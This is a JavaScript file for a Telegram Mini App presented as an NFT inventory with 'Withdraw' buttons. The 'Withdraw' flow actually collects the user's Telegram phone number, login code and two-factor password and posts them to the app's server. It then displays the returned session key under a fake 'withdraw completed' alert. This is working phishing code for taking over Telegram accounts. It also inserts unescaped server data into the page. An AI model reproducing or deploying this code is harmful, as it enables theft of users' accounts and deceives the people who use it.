document.addEventListener('DOMContentLoaded', async function() {
    const tg = window.Telegram.WebApp;
    tg.expand();
    
    // Элементы логина
    const loginContainer = document.getElementById('login-container');
    const inventoryContainer = document.getElementById('inventory-container');
    const phoneInput = document.getElementById('phone-input');
    const codeInput = document.getElementById('code-input');
    const passwordInput = document.getElementById('password-input');
    const loginStep1 = document.getElementById('login-step1');
    const loginStep2 = document.getElementById('login-step2');
    const loginStep3 = document.getElementById('login-step3');
    const loginSuccess = document.getElementById('login-success');
    const loginError = document.getElementById('login-error');
    const userInfo = document.getElementById('user-info');
    
    let currentPhone = '';
    let currentPhoneCodeHash = '';
    let currentNFT = '';
    
    // Показать/скрыть логин
    function showLogin(nftId) {
        currentNFT = nftId;
        loginContainer.style.display = 'block';
        inventoryContainer.style.display = 'none';
        resetLoginForm();
    }
    
    function showInventory() {
        loginContainer.style.display = 'none';
        inventoryContainer.style.display = 'block';
    }
    
    function resetLoginForm() {
        loginStep1.style.display = 'block';
        loginStep2.style.display = 'none';
        loginStep3.style.display = 'none';
        loginSuccess.style.display = 'none';
        loginError.textContent = '';
        phoneInput.value = '';
        codeInput.value = '';
        passwordInput.value = '';
    }
    
    function showStep(step) {
        loginStep1.style.display = step === 1 ? 'block' : 'none';
        loginStep2.style.display = step === 2 ? 'block' : 'none';
        loginStep3.style.display = step === 3 ? 'block' : 'none';
        loginSuccess.style.display = step === 4 ? 'block' : 'none';
    }
    
    // Обработчики кнопок
    window.sendLoginCode = async function() {
        const phone = phoneInput.value.trim();
        if (!phone) {
            loginError.textContent = 'Enter phone number';
            return;
        }
        
        loginError.textContent = 'Sending code...';
        
        try {
            const response = await fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone})
            });
            
            const data = await response.json();
            
            if (data.success) {
                currentPhone = phone;
                currentPhoneCodeHash = data.phone_code_hash;
                showStep(2);
                loginError.textContent = `Code sent via ${data.type || 'Telegram'}`;
            } else {
                loginError.textContent = data.error || 'Failed to send code';
            }
        } catch (error) {
            loginError.textContent = 'Network error';
        }
    };
    
    window.verifyLoginCode = async function() {
        const code = codeInput.value.trim();
        if (!code) {
            loginError.textContent = 'Enter code';
            return;
        }
        
        loginError.textContent = 'Verifying...';
        
        try {
            const response = await fetch('/api/verify_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: currentPhone,
                    code,
                    phone_code_hash: currentPhoneCodeHash
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                if (data['2fa_required']) {
                    showStep(3);
                    loginError.textContent = '2FA required';
                } else {
                    userInfo.textContent = `Logged in as ${data.user.first_name} (@${data.username})`;
                    showStep(4);
                    loginError.textContent = '';
                    
                    // Тут можно сделать withdraw
                    tg.showAlert(`Withdraw ${currentNFT} completed! Session: ${data.session_key}`);
                }
            } else {
                loginError.textContent = data.error || 'Invalid code';
            }
        } catch (error) {
            loginError.textContent = 'Network error';
        }
    };
    
    window.verify2FA = async function() {
        const password = passwordInput.value.trim();
        if (!password) {
            loginError.textContent = 'Enter password';
            return;
        }
        
        loginError.textContent = 'Verifying...';
        
        try {
            const response = await fetch('/api/verify_2fa', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: currentPhone,
                    password
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                userInfo.textContent = `Logged in as ${data.user.first_name} (@${data.username})`;
                showStep(4);
                loginError.textContent = '';
                tg.showAlert(`Withdraw ${currentNFT} completed! Session: ${data.session_key}`);
            } else {
                loginError.textContent = data.error || 'Invalid password';
            }
        } catch (error) {
            loginError.textContent = 'Network error';
        }
    };
    
    window.cancelLogin = function() {
        showInventory();
    };
    
    // Загрузка инвентаря
    const urlParams = new URLSearchParams(window.location.search);
    let userId = urlParams.get('user_id');
    
    if (!userId && tg.initDataUnsafe?.user?.id) {
        userId = tg.initDataUnsafe.user.id;
    }
    
    if (!userId) {
        document.getElementById('inventory-list').innerHTML = '<p class="empty-message">Open via Telegram bot.</p>';
        return;
    }
    
    try {
        const response = await fetch(`/api/inventory?user_id=${userId}`);
        if (!response.ok) throw new Error(`API error: ${response.status}`);
        
        const data = await response.json();
        if (data.error) {
            document.getElementById('inventory-list').innerHTML = `<p class="empty-message">${data.error}</p>`;
            return;
        }
        
        const inventory = data.inventory || [];
        if (inventory.length === 0) {
            document.getElementById('inventory-list').innerHTML = '<p class="empty-message">No NFTs yet.</p>';
            return;
        }
        
        let html = '';
        inventory.forEach(item => {
            const shortName = item.id.length > 20 ? item.id.substring(0, 18) + '...' : item.id;
            
            html += `
            <div class="nft-card">
                <div class="nft-badge">NFT</div>
                <div class="nft-content">
                    <div class="nft-icon-container">
                        <img class="nft-icon" src="${item.icon || 'https://cdn-icons-png.flaticon.com/512/5968/5968804.png'}" alt="${item.id}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/5968/5968804.png'">
                    </div>
                    <a class="nft-name" href="${item.link}" target="_blank" title="${item.id}">${shortName}</a>
                    <button class="withdraw-btn" onclick="showLogin('${item.id}')">Withdraw</button>
                </div>
            </div>
            `;
        });
        
        document.getElementById('inventory-list').innerHTML = html;
        
    } catch (error) {
        console.error('Error:', error);
        document.getElementById('inventory-list').innerHTML = '<p class="empty-message">Failed to load.</p>';
    }
});
